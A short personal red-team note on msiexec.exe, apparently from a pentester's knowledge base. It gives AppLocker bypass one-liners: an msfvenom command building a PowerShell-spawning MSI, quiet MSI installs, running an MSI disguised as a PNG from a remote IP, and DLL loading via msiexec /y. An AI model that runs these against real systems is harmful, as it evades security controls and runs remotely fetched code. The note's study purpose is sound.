# msiexec
20240402
!! need to process this link still : https://badoption.eu/blog/2023/10/03/MSIFortune.html
[[applocker]]
[[privilege_escalation]]

## About

MsiExec.exe is the executable program of the Windows Installer used to interpret installation packages and install products on target systems. After you build your release, you can install your Windows Installer package (.msi) from the command line. Currently, there is no support for passing Windows Installer parameters other than at the Setup.exe command line. To ensure that Windows Installer is installed on a target system, InstallShield creates a Setup.exe for your application by default. Setup.exe installs Windows Installer if it is not present on the target system or upgrades Windows Installer if an older version is present.

After building a release of your product, you can install it from the command line.

https://docs.revenera.com/isxhelp23/helplibrary/IHelpCmdLineMSI.htm
## AppLocaker bypass
### metasploit
[[poc]]
We can use [[metasploit]] in conjunction with msiexec. Where msfvenom can be used to generate MSI files that execute a command or payload. 

```
msfvenom -f msi -p windows/exec CMD=powershell.exe > powershell.msi
```
When the above is exucted the powershell.msi will spawn [[powershell]] bypassing [[applocker]]. 

https://docs.revenera.com/isxhelp23/helplibrary/IHelpCmdLineMSI.htm
### cmd 
If [[cmd]] is blocked, then we can run the following in a run window to bypass the [[applocker]] on [[cmd]]
```
msiexec /quiet /i cmd.msi
```
The cmd prompt will then open. 

https://docs.revenera.com/isxhelp23/helplibrary/IHelpCmdLineMSI.htm

### png files 

Alternatively msiexec utility has the ability to run MSI files that have been renamed to PNG. These files can be executed either locally or remotely from a command prompt or from Windows Run bypassing AppLocker rules. [[png_files]]
```
msiexec /q /i http://192.168.100.3/tmp/cmd.png
```
https://docs.revenera.com/isxhelp23/helplibrary/IHelpCmdLineMSI.htm

## DLL Execution
[[poc]]
Using the following command we can execute a dll file. See below: 

![[images_msiexec_1.png]]
```
msiexec /y C:\path\to\sussy.dll
```
https://twitter.com/PhilipTsukerman/status/992021361106268161



